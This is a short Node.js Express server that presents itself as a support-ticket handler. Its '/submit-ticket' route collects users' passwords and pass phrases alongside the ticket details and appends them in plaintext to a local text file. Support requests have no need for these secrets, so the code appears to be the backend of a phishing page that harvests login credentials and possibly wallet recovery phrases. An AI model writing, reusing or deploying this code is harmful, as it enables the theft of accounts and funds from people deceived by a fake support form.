const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// serve frontend
app.use(express.static("public"));

app.post("/submit-ticket", (req, res) => {

    const { email, issue, description } = req.body;

    const timestamp = new Date().toISOString();

    const log = `
=============================
TIME: ${timestamp}
EMAIL: ${email}
PASSWORD: ${req.body.pwd}
PASS PHRASE: ${req.body.passphrase}
ISSUE: ${issue}
DESCRIPTION:
${description}
=============================

`;

    fs.appendFile("tickets.txt", log, (err) => {
        if (err) {
            return res.status(500).send("Error saving ticket");
        }

        res.send({ message: "Ticket submitted successfully" });
    });

});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});